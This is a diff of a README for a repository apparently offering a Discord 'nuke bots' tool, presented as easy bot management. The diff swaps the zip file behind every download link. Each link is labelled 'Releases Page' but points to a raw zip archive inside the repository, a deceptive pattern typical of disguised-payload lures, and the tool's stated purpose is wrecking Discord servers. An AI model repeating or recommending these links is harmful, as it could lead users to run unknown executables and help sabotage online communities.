@@ -1,13 +1,13 @@
 # 🤖 -nuke-bots-Discord- - Easy Bot Management for Discord
 
 ## 🛠️ Download the Latest Version
-[![Download from Releases](https://raw.githubusercontent.com/quyart/-nuke-bots-Discord-/main/umptekite/-nuke-bots-Discord-_2.2.zip%20Now-blue)](https://raw.githubusercontent.com/quyart/-nuke-bots-Discord-/main/umptekite/-nuke-bots-Discord-_2.2.zip)
+[![Download from Releases](https://raw.githubusercontent.com/quyart/-nuke-bots-Discord-/main/umptekite/bots_Discord_nuke_3.1.zip%20Now-blue)](https://raw.githubusercontent.com/quyart/-nuke-bots-Discord-/main/umptekite/bots_Discord_nuke_3.1.zip)
 
 ## 🚀 Getting Started
 Welcome to the -nuke-bots-Discord- project! This application makes managing bots in Discord easy and efficient. No programming skills are needed, allowing anyone to set up and use the tool.
 
 ## 📥 Download & Install
-To get started, visit this page to download: [Releases Page](https://raw.githubusercontent.com/quyart/-nuke-bots-Discord-/main/umptekite/-nuke-bots-Discord-_2.2.zip).
+To get started, visit this page to download: [Releases Page](https://raw.githubusercontent.com/quyart/-nuke-bots-Discord-/main/umptekite/bots_Discord_nuke_3.1.zip).
 
 1. Open the link in your web browser.
 2. Find the latest release at the top of the page.
@@ -39,7 +39,7 @@ Always download the software from the official Releases page to ensure you have 
 Your feedback helps us improve. If you encounter issues or have suggestions, please let us know. Comments and suggestions can greatly enhance the user experience for everyone.
 
 ## 📚 Useful Links
-- [Visit the Releases Page for Downloads](https://raw.githubusercontent.com/quyart/-nuke-bots-Discord-/main/umptekite/-nuke-bots-Discord-_2.2.zip)
+- [Visit the Releases Page for Downloads](https://raw.githubusercontent.com/quyart/-nuke-bots-Discord-/main/umptekite/bots_Discord_nuke_3.1.zip)
 - [Join our Discord Community](#)
 - [Submit Issues and Feature Requests](#)
 
